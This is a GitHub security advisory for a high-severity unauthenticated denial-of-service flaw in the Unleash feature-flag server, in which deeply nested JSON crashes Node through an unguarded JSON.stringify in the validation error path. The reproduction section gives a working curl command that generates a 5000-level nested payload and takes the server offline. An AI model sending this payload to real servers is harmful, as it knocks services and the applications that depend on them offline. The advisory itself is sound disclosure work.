# [H] Unleash: Unauthenticated single-request DoS via OpenAPI validation error formatter

## Summary
Severity: High
Advisory: GHSA-r5pq-6chh-j3xp
CVE: CVE-2026-63462
CWE: CWE-674
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-21
Source: https://github.com/advisories/GHSA-r5pq-6chh-j3xp
Type: github-advisory

## Affected
- npm: `unleash-server` — affected >=0 <7.5.2
- npm: `unleash-server` — affected >=7.6.0 <7.6.5
- npm: `unleash-server` — affected >=8.0.0 <8.0.2

## Details
## Summary

An unauthenticated `POST` to any OpenAPI-validated endpoint, including the anonymous `POST /edge/validate` and `POST /edge/issue-token`, crashes the entire Unleash server with one request body of deeply-nested JSON.

When request-body validation fails, Unleash builds the error message by calling `JSON.stringify` on the raw offending value taken from the request body. A value nested a few thousand levels deep makes `JSON.stringify` recurse past the V8 call-stack limit and throw `RangeError: Maximum call stack size exceeded`.

The throw is synchronous inside an Express error-handling middleware that has no try/catch, and the process registers no `uncaughtException` handler (only `unhandledRejection`). Node terminates the process with `exit(1)`.

The body parser sets no JSON nesting-depth limit, the payload (about 10 KB at depth 5000) stays far under the 100 KB body-size limit, and the same error formatter serves every API route, so the trigger is route-independent.

Result: a remote attacker with no account, token, or cookie takes the whole server offline with a single 10 KB request, and keeps it offline by replaying it.

## Affected

Unleash OSS server, confirmed live-exploitable on v8.0.0 (`unleashorg/unleash-server:8.0.0`).
Vulnerable code is the shared request-validation error path (`src/lib/error/bad-data-error.ts` `genericErrorMessage`), present on current `main`.
Reachable on a stock install: no feature flag, no setting, no authentication, no CSRF token, and no cookie required.
The 100 KB request-body size limit does not mitigate it; the crashing payload is about 10 KB.

## Root cause

On validation failure the error formatter serializes the raw offending request value with an unguarded `const youSent = JSON.stringify(propertyValue)` (`src/lib/error/bad-data-error.ts:75`), where `propertyValue` is read straight from the request body via `lodash.get` (`bad-data-error.ts:123`). A deeply-nested array or object makes `JSON.stringify` recurse once per level and throw `RangeError: Maximum call stack size exceeded`. `fromOpenApiValidationErrors` (`bad-data-error.ts:158`) runs from the Express error middleware `openAPIValidationMiddleware` (`src/lib/routes/controller.ts:68`), which calls it with no try/catch (`controller.ts:70`), while the controller's own try/catch (`controller.ts:103`) wraps only the route handler. The process registers only `process.on('unhandledRejection')` (`src/lib/server-impl.ts:274`) and no `uncaughtException` handler, so the synchronous throw terminates Node with `exit(1)`. The same unguarded pattern exists at `fromJoiError` (`bad-data-error.ts:175`) and at `handleErrors` (`src/lib/routes/util.ts:42`), whose own comment records that `JSON.stringify(finalError.details)` "also hangs" (`util.ts:63`).

## Reproduction

`unleashorg/unleash-server:8.0.0` started from the repository `docker-compose.yml`, default config, no credentials, server at `http://localhost:4242`.

1. A shallow body returns a normal 400 and the server stays up.

```
curl -s -X POST http://localhost:4242/edge/validate \
  -H 'Content-Type: application/json' -d '{"tokens":[[]]}'
# HTTP 400 BadDataError: "The `/body/tokens/0` property must be string. You sent []."
```

2. A single anonymous body nested 5000 levels deep (10013 bytes) crashes the process.

```
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://localhost:4242/edge/validate \
  -H 'Content-Type: application/json' \
  --data-binary "$(python3 -c 'd=5000;print("{\"tokens\":["+"["*d+"]"*d+"]}")')"
# 000  (connection dropped mid-response; Node exited)
```

3. The server is gone and does not recover on its own.

```
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:4242/health
# 000
docker inspect repo-web-1 --format '{{.State.Status}} restarts={{.RestartCount}}'
# exited restarts=0
```

Live-verified: one anonymous 10013-byte request to `/edge/validate` drove `/health` from 200 to 000; the container logs showed the `RangeError` stack through `bad-data-error` and `openAPIValidationMiddleware`, and the process did not restart. The crash threshold is about 4000 to 4500 nesting levels; depth 5000 crashes reliably. The same crash reproduces on `POST /edge/issue-token` with a nested object, confirming route and shape independence.

## Impact

- Single 10 KB request with no account, token, or cookie takes the entire server offline.
- Replaying the request (kilobits per restart interval) sustains a near-total outage; with no restart policy the first request is a permanent kill.
- Feature-flag evaluation sits on the request path of dependent applications, so the outage propagates to them.
- Every OpenAPI-validated endpoint is a trigger, including anonymous ones.

## Credit

Jan Kahmen, [turingpoint](https://www.turingpoint.de) (jan@turingpoint.de)

## References
- https://github.com/Unleash/unleash/security/advisories/GHSA-r5pq-6chh-j3xp
- https://github.com/Unleash/unleash/commit/b0e4da63249a9403bc209e0581db223326cb8dcf
- https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1
- https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d
- https://github.com/Unleash/unleash
- https://github.com/Unleash/unleash/releases/tag/v7.5.2
- https://github.com/Unleash/unleash/releases/tag/v7.6.5
- https://github.com/Unleash/unleash/releases/tag/v8.0.2
